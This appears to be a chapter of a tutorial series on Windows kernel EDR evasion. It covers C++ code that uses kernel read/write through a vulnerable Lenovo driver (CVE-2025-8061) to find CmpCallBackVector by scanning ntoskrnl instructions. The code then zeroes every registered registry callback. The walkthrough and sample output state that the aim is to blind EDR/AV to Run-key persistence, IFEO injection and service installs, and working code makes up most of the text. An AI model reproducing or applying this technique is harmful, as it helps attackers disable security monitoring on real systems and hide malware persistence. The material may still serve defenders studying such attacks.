# 11 — CmRegisterCallback Removal (Registry Notification Callbacks)

**File:** `11_cm_callback.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Kernel VA read/write + RIP-relative LEA scan  
**Output:** EDR no longer receives notifications about registry operations (create key, set value, delete, etc.)

---

## Objective

Locate `CmpCallBackVector` — the 100-slot array holding the `EX_CALLBACK` entries for registry callbacks — and zero all populated slots. Result: EDR/AV no longer knows when the registry changes → bypass persistence detection, IFEO injection detection, driver installation detection.

---

## Background Theory

### CmRegisterCallback — Registry Monitoring

EDR and AV products call `CmRegisterCallback(fn, ctx, &cookie)` to register a callback that receives notification for every registry operation:

| Event | Detection |
|-------|-----------|
| Create key under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Persistence |
| Set `AppInit_DLLs` or `IFEO\Debugger` | DLL injection prep |
| Create key under `HKLM\SYSTEM\CurrentControlSet\Services\*` | Driver/service install |
| Modify security keys | Privilege escalation detection |

### CmpCallBackVector — Internal Storage

The Windows kernel stores registry callbacks in an **array** (not a linked list) named `CmpCallBackVector`:

```
CmpCallBackVector[100]:
    [0]   EX_CALLBACK  (8 bytes, ExFastRef format)
    [1]   EX_CALLBACK  (8 bytes, ExFastRef format)
    ...
    [99]  EX_CALLBACK  (8 bytes, ExFastRef format)
```

### EX_CALLBACK and EX_CALLBACK_ROUTINE_BLOCK

```
EX_CALLBACK (8 bytes, ExFastRef):
    bits[63:4] = pointer to EX_CALLBACK_ROUTINE_BLOCK (16-byte aligned)
    bits[3:0]  = reference count

EX_CALLBACK_ROUTINE_BLOCK:
    +0x000  RefCount   EX_RUNDOWN_REF  (8 bytes)
    +0x008  Function   PEX_CALLBACK_FUNCTION   ← actual address of the callback
    +0x010  Context    PVOID           ← context passed to CmRegisterCallback
```

To remove a callback: zero the entire 8-byte EX_CALLBACK slot. The kernel skips null entries when iterating.

### Locating CmpCallBackVector

The array is **not exported** directly. We find it by:

1. `CmRegisterCallbackEx` is an exported function from ntoskrnl
2. Scan its code (and callees via CALL following) for `LEA Rx,[RIP+imm32]` instructions
3. Each LEA target in `.data` is a candidate → validate by reading the first 16 slots
4. If slots contain valid ExFastRef kernel pointers → this is `CmpCallBackVector`

---

## Code Walkthrough

### Constants

```cpp
#define CM_SLOTS 100  // CmpCallBackVector has exactly 100 slots
```

100 is hardcoded in the Windows kernel since Vista — the maximum limit for registry callbacks.

### FindCmpCallBackVector() — Algorithm

```cpp
static uint64_t FindCmpCallBackVector(uint64_t cr3,
                                       uint64_t func_va,      // VA of CmRegisterCallbackEx
                                       uint64_t data_va, uint32_t data_size)
{
    uint64_t scan_targets[8] = { func_va };
    int n_targets = 1;
    // Queue of up to 8 functions to scan (original function + callees)
```

### Step 1: scan code and follow CALLs

```cpp
    for (int t = 0; t < n_targets; t++) {
        uint64_t scan_va = scan_targets[t];
        uint8_t code[768] = {};
        KernelRead(cr3, scan_va, code, sizeof(code));  // read 768 bytes of code

        for (int i = 0; i < (int)sizeof(code) - 7; i++) {
            // Follow CALL E8 imm32 to scan sub-functions
            if (code[i] == 0xE8 && n_targets < 8) {
                int32_t rel = *(int32_t*)(code + i + 1);
                uint64_t callee = scan_va + i + 5 + (int64_t)rel;
                // callee VA = address of next instruction + signed offset
                
                if ((callee >> 48) == 0xFFFF) {  // must be a kernel VA
                    // De-duplicate: do not add if already in the queue
                    bool dup = false;
                    for (int k = 0; k < n_targets; k++)
                        if (scan_targets[k] == callee) { dup = true; break; }
                    if (!dup) scan_targets[n_targets++] = callee;
                }
            }
```

`CmRegisterCallbackEx` typically calls an internal helper (e.g., `CmpRegisterCallbackInternal`) that actually accesses the array. CALL following ensures we scan that callee as well.

### Step 2: locate the LEA [RIP+X] instruction

```cpp
            // Detect LEA REX.W Rx,[RIP+imm32]
            uint8_t pfx = code[i];
            uint8_t op  = code[i+1];
            if ((pfx & 0xF0) != 0x40) continue;  // must have REX prefix (0x40-0x4F)
            if (op != 0x8D) continue;             // 0x8D = LEA opcode
            uint8_t modrm = code[i+2];
            if ((modrm & 0xC7) != 0x05) continue;
            // ModRM: bits[7:6]=00 (mod=memory), bits[2:0]=101 (rm=101 → RIP-relative)
            // 0xC7 mask: keeps bits 7,6,2,1,0 → 0xC7 & modrm must == 0x05
```

LEA encoding:
```
byte 0: REX prefix (0x48=REX.W, 0x4C=REX.W+REX.R, etc.)
byte 1: 0x8D (LEA)
byte 2: ModRM (mod=00, reg=any, rm=101 → RIP-relative)
byte 3-6: imm32 (signed offset from RIP of the next instruction)
```

### Step 3: compute target VA

```cpp
            int32_t  imm32  = *(int32_t*)(code + i + 3);
            uint64_t target = scan_va + i + 7 + (int64_t)imm32;
            // RIP at next instruction = scan_va + i + 7
            // (REX=1 + LEA=1 + ModRM=1 + imm32=4 = 7 bytes)
            // target_va = RIP + sign_extended(imm32)
```

### Step 4: validate as CmpCallBackVector

```cpp
            // Target must lie within ntoskrnl .data
            if (target < data_va || target + CM_SLOTS * 8 > data_va + data_size) continue;
            // Need at least 100*8 = 800 bytes from target to end of .data

            // Read the first 16 slots
            uint64_t slots[16] = {};
            KernelRead(cr3, target, slots, sizeof(slots));
            
            bool has_valid   = false;
            bool all_plausible = true;
            for (int k = 0; k < 16; k++) {
                uint64_t v = slots[k];
                if (v == 0) continue;  // empty slot — OK
                uint64_t ptr = v & ~0xFULL;  // clear low 4 bits (ExFastRef refcount)
                if ((ptr >> 48) == 0xFFFF) { has_valid = true; continue; }
                // Must be a kernel VA: bits[63:48] = 0xFFFF
                all_plausible = false; break;  // unexpected value → false positive
            }
            if (!all_plausible) continue;
            if (!has_valid) continue;  // all null → array empty, not useful
            
            printf("    [+] CmpCallBackVector: VA=0x%016llX\n", target);
            return target;
```

Validation: every non-null slot must be a valid ExFastRef (kernel pointer with low 4 bits = refcount). If any value is not a kernel pointer → random data, skip.

### Main: scan from multiple exported functions

```cpp
static const char *scan_exports[] = {
    "CmRegisterCallbackEx", "CmUnRegisterCallback", "CmRegisterCallback", nullptr
};

uint64_t vec_va = 0;
for (int i = 0; scan_exports[i] && !vec_va; i++) {
    uint64_t fn = GetNtExport(cr3, nt.base, scan_exports[i]);
    if (!fn) continue;
    printf("    [*] Scanning %s @ 0x%016llX...\n", scan_exports[i], fn);
    vec_va = FindCmpCallBackVector(cr3, fn, nt.data_va, nt.data_size);
}
```

Fallback strategy: if `CmRegisterCallbackEx` has no direct LEA (because it calls an internal function via indirect call), try `CmUnRegisterCallback`, which is typically shorter and accesses the array more directly.

### Enumeration: read the Function pointer from EX_CALLBACK_ROUTINE_BLOCK

```cpp
for (int i = 0; i < CM_SLOTS; i++) {
    uint64_t slot_va = vec_va + (uint64_t)i * 8;  // 8 bytes per slot
    uint64_t excb = 0;
    if (!KernelReadU64(cr3, slot_va, &excb)) continue;
    if (!excb) continue;  // null slot — skip
    
    uint64_t rb_ptr = excb & ~0xFULL;  // clear ExFastRef refcount bits
    // rb_ptr = pointer to EX_CALLBACK_ROUTINE_BLOCK
    
    uint64_t fn_va = 0;
    KernelReadU64(cr3, rb_ptr + 0x008, &fn_va);
    // EX_CALLBACK_ROUTINE_BLOCK.Function at +0x008
    
    printf("  [%02d] ExCb=0x%016llX  RoutineBlock=0x%016llX  Fn=0x%016llX\n",
           i, excb, rb_ptr, fn_va);
}
```

For display purposes: dereference the ExFastRef pointer → read `.Function` at +0x008 of EX_CALLBACK_ROUTINE_BLOCK.

### Zero and restore

```cpp
// Zero
for (int i = 0; i < CM_SLOTS; i++) {
    uint64_t slot_va = vec_va + (uint64_t)i * 8;
    uint64_t excb = 0;
    if (!KernelReadU64(cr3, slot_va, &excb) || !excb) continue;
    
    // Save for restore
    g_saved[g_saved_count].slot = i;
    g_saved[g_saved_count].orig_excb = excb;
    g_saved[g_saved_count].slot_va = slot_va;
    
    // Zero the entire 8-byte ExFastRef slot
    if (KernelWriteU64(cr3, slot_va, 0)) {
        uint64_t rb = 0xDEAD;
        KernelReadU64(cr3, slot_va, &rb);
        if (rb == 0) {
            g_saved_count++;
            zeroed++;
        } else {
            printf("  [%02d] write didn't stick (HVCI?)\n", i);
        }
    }
}

// Restore
for (int i = 0; i < g_saved_count; i++) {
    KernelWriteU64(cr3, g_saved[i].slot_va, g_saved[i].orig_excb);
    // Write back the original ExFastRef value (including the low refcount bits)
}
```

---

## Expected Output

```
[*] CmpCallBackVector — 100 slots:
  [00] ExCb=0xFFFF80038ABC1002  RoutineBlock=0xFFFF80038ABC1000  Fn=0xFFFF80021234ABCD
  [01] ExCb=0xFFFF80039DEF2004  RoutineBlock=0xFFFF80039DEF2000  Fn=0xFFFF80027654EFAB
  [02] ExCb=0x0000000000000000  (empty)
  ...

[*] Press Enter to ZERO all 2 CmCallback slots...

  [00] zeroed
  [01] zeroed

[+] 2/2 callback slots zeroed
[+] Registry monitoring by EDR/AV is now DISABLED:
    - persistence via RunKey goes undetected
    - IFEO/AppInit_DLLs changes go undetected
    - service installation goes undetected
```

---

## Stability

| Issue | Explanation |
|-------|-------------|
| PatchGuard | **Not checked** — CmpCallBackVector is data-only, stable |
| HVCI | Not affected — .data pages are not protected |
| Scan failure | If LEA is not found (compiler optimization changed code), try CmUnRegisterCallback |
| 100-slot limit | Windows hardcodes 100 slots since Vista — unchanged |
| EDR re-registration | Some EDRs detect and re-register, but only when a registry event triggers it |

---

## Flow Summary

```
GetSystemCR3() → cr3
GetNtoskrnlInfo(cr3) → nt.base, .data bounds

Try each: CmRegisterCallbackEx, CmUnRegisterCallback, CmRegisterCallback
    GetNtExport(fn_name) → fn_va
    FindCmpCallBackVector(cr3, fn_va, .data bounds):
        Scan 768 bytes of code + callees (CALL follow)
        Find LEA [RIP+X] → target in .data, target + 800 bytes fit
        Validate 16 slots: kernel ExFastRef pointers
        → vec_va (CmpCallBackVector)

Enumerate 100 slots:
    For each non-null slot:
        read ExCb → rb_ptr = ExCb & ~0xF
        read rb_ptr+0x008 → Function VA
        Print

[User confirms]

Zero pass:
    For each non-null slot:
        KernelWriteU64(slot_va, 0)
        Readback verify
        Save original excb for restore

[+] Registry callbacks removed

[Press Enter]

Restore:
    For each saved slot:
        KernelWriteU64(slot_va, orig_excb)
```
